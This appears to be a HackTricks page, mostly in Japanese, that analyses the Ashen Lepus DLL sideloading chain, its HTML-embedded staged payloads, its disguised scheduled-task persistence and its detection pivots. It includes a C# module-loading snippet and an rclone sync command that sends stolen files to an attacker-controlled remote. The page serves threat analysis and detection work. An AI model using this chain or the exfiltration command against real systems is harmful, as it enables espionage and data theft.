# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 手口の概要

Ashen Lepus (aka WIRTE) は、DLL sideloading、staged HTML payloads、そしてモジュール式の .NET backdoors を連鎖させて、中東の外交ネットワーク内に持続化する再現可能なパターンを武器化した。この手法は以下に依存するため、任意のオペレーターが再利用可能である:

- **Archive-based social engineering**: 無害に見えるPDFがターゲットにファイル共有サイトからRARアーカイブを取得するよう指示する。アーカイブには本物に見えるドキュメントビューアのEXE、信頼されたライブラリ名を模した悪意のあるDLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、およびデコイの `Document.pdf` が同梱されている。
- **DLL search order abuse**: 被害者がEXEをダブルクリックすると、Windowsは現在のディレクトリからDLLインポートを解決し、悪意あるローダー（AshenLoader）が信頼されたプロセス内で実行され、デコイPDFが開いて疑いを逸らす。
- **Living-off-the-land staging**: 以降のすべてのステージ（AshenStager → AshenOrchestrator → modules）は必要になるまでディスクに残さず、無害に見えるHTMLレスポンス内に隠された暗号化ブロブとして配信される。

## マルチステージ・サイドローディングチェーン

1. **Decoy EXE → AshenLoader**: EXEはAshenLoaderをサイドロードし、AshenLoaderはホスト情報の収集を行いそれをAES-CTRで暗号化して、`token=`, `id=`, `q=`, `auth=` のようなローテートするパラメータ内に入れて、API風のパス（例: `/api/v2/account`）にPOSTする。
2. **HTML extraction**: C2はクライアントIPがターゲット地域にジオロケートされ、`User-Agent`がインプラントと一致した場合にのみ次のステージを返し、サンドボックスを困惑させる。チェックを通過するとHTTPボディにはBase64/AES-CTRで暗号化されたAshenStagerペイロードを含む `<headerp>...</headerp>` ブロブが含まれている。
3. **Second sideload**: AshenStagerは別の正当なバイナリとともに展開され、そのバイナリが `wtsapi32.dll` をインポートする。バイナリに注入された悪意あるコピーはさらにHTMLを取得し、今回は `<article>...</article>` を切り出してAshenOrchestratorを復元する。
4. **AshenOrchestrator**: Base64エンコードされたJSON設定をデコードするモジュール式の .NET コントローラ。設定の `tg` と `au` フィールドを連結／ハッシュしてAESキーを生成し、それで `xrk` を復号する。得られたバイト列は、その後取得される各モジュールブロブに対するXORキーとして使われる。
5. **Module delivery**: 各モジュールはHTMLコメントを通じて記述され、パーサを任意のタグへリダイレクトして `<headerp>` や `<article>` のみを探す静的ルールを破る。モジュールには永続化（`PR*`）、アンインストーラ（`UN*`）、偵察（`SN`）、画面キャプチャ（`SCT`）、ファイル探索（`FE`）が含まれる。

### HTMLコンテナ解析パターン
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
たとえ防御側が特定要素をブロックまたは削除しても、オペレータはHTMLコメントで示されたタグを変更するだけで配信を再開できる。

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Recon smuggling**: 列挙されたデータには高価値アプリを識別するために Program Files の一覧が含まれ、ホストを離れる前に常に暗号化される。
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **Gated delivery**: サーバはジオフェンスされ、実際のインプラントにのみ応答する。未承認クライアントには疑わしくない HTML を返す。

## Persistence & Execution Loop

AshenStager は Windows のメンテナンスジョブを偽装したスケジュールタスクを作成し、`svchost.exe` 経由で実行する。例:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらのタスクは起動時または間隔でサイドローディングチェーンを再起動し、AshenOrchestrator が再びディスクに触れずに新しいモジュールを要求できるようにする。

## Using Benign Sync Clients for Exfiltration

オペレータは専用モジュールを通じて外交文書を `C:\Users\Public`（全ユーザ読み取り可能で目立たない）に配置し、そのディレクトリを攻撃者管理のストレージと同期するために正規の [Rclone](https://rclone.org/) バイナリをダウンロードする:

1. **Stage**: ターゲットファイルを `C:\Users\Public\{campaign}\` にコピー/収集する。
2. **Configure**: Rclone の設定を攻撃者管理の HTTPS エンドポイント（例: `api.technology-system[.]com`）を指すように配布する。
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、トラフィックが通常のクラウドバックアップに類似するようにする。

Rclone は正規のバックアップワークフローで広く使用されているため、防御側は異常な実行（新しいバイナリ、怪しいリモート、または `C:\Users\Public` の突然の同期等）に注目する必要がある。

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
